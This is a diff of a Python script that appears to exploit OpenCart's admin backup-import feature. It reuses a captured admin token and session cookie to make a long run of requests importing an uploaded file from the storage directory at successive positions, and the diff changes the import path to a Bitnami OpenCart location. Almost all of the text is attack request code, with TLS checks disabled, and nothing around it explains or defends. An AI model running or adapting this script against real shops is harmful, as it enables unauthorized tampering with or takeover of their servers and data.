@@ -73,7 +73,7 @@ def adddatefile(host):
 
 
 def sure(host):
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=8688"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=8688"
     burp0_cookies = {"__atuvc": "1%7C12%2C0%7C13%2C1%7C14", "currency": "USD", "language": "zh-cn", "OCSESSID": adcookies}
     burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=tool/backup&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
@@ -81,274 +81,274 @@ def sure(host):
 
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=22122"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=22122"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=38337"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=38337"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=56503"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=56503"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=71968"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=71968"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=75913"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=75913"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=89750"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=89750"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=108595"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=108595"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=127632" 
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=127632" 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=147926"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=147926"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=168160"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=168160"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=186856"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=186856"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=205782"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=205782"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=225718"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=225718"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=245942"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=245942"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=266161"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=266161"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=286053"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=286053"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=294649"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=294649"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=302641"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=302641"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=311161"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=311161"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=330357"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=330357"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=352744"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=352744"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=359204"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=359204"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=372009"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=372009"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=390754"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=390754"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=413050"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=413050"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=420397"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=420397"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=420793"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=420793"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=443557"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=443557"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=455346"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=455346"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=467391"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=467391"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=479535"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=479535"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=491651"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=491651"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=503579"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=503579"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=515730"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=515730"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=527799"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=527799"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=539731"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=539731"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=552003"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=552003"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=564250"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=564250"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=576727"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=576727"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=589107"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=589107"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=601317"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=601317"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=613857"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=613857"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=626141"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=626141"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=638337"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=638337"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=650664"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=650664"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=662861"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=662861"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=675169"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=675169"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=687329"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=687329"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=699563"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=699563"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=711624"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=711624"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=723708"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=723708"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=735913"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=735913"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=748260"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=748260"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=760406"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=760406"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=772727"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=772727"
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=785010"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=785010"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=797257"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=797257"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=809491"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=809491"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=822186"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=822186"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=834426"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=834426"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=846606"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=846606"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=859172"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=859172"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=871731"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=871731"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=883961"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=883961"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=896093"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=896093"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=908229"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=908229"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=921000"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=921000"
 
     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=934612"
+    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/opencart/system/storage/upload/"+datetoken+"&position=934612"
 
     r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     #print(r.text)
 
 
-    burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=950135"
